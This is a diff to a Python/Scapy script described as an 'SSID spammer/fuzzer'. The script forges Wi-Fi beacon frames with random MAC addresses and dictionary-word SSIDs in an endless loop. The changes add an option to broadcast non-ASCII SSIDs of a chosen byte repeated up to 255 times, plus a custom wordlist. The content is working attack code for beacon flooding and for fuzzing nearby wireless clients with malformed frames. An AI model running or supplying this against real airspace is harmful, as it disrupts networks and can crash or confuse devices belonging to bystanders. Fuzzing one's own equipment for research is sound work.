@@ -8,12 +8,19 @@ from argparse import ArgumentParser
 
 parser = ArgumentParser(description='SSID spammer/fuzzer')
 parser.add_argument('-i', metavar='interface', action="store", default=False, help='wireless interface', required=True)
+#parser.add_argument('-c', metavar='channel', action="store", default=1, help='wireless channel', required=False)
+#parser.add_argument('--hop', metavar='hop', action="store", default=False, help='channel hop', required=False)
+parser.add_argument('-n',action="store_true", default=False, help='Use nonascii ssid (uses \x00 * 255)',required=False )
+parser.add_argument('-x', metavar='nonascii_char',action="store", default="00", help='nonascii char (-x 90 for example)',required=False )
+parser.add_argument('-l', metavar='nonascii', type=int, action="store", default="255", help='nonascii ssid length (MAX 255)',required=False )
+parser.add_argument('-w',metavar='wordlist',action="store", default="/etc/dictionaries-common/words", help='wordlist', required=False)
 args = parser.parse_args()
 
 interface = args.i
 
+
 conf.iface= interface
-words = [line.strip() for line in open('/etc/dictionaries-common/words')]
+words = [line.strip() for line in open(args.w)]
 
 ssid=	"example"	#we will try to fuzz this field
 rates=""
@@ -24,18 +31,16 @@ def createSSID():
   word2="'"
   while "'" in word1:
     word1=(random.choice(words))
-    print word1
   while "'" in word2:
     word2=(random.choice(words))
-    print word2
   essid=str(word1)+""+str(word2)
-  print str(essid)
+  if len(essid) > 255:
+    essid=essid[:254]
   return essid  
 
 def sendSSID(ssid):
 #this link was very helpful in figuring some of this out: https://www.trustwave.com/Resources/SpiderLabs-Blog/Smuggler---An-interactive-802-11-wireless-shell-without-the-need-for-authentication-or-association/
   snd_addr=RandMAC()._fix()
-  print str(snd_addr)
   i=0
   while i < 20:
     newtime = time.time()
@@ -45,5 +50,9 @@ def sendSSID(ssid):
     i+=1
 
 while True:
-  ssid=createSSID()
+  if args.n:
+    hexchar=(args.x).decode('hex') 
+    ssid=hexchar*args.l
+  else:
+    ssid=createSSID()
   sendSSID(str(ssid))
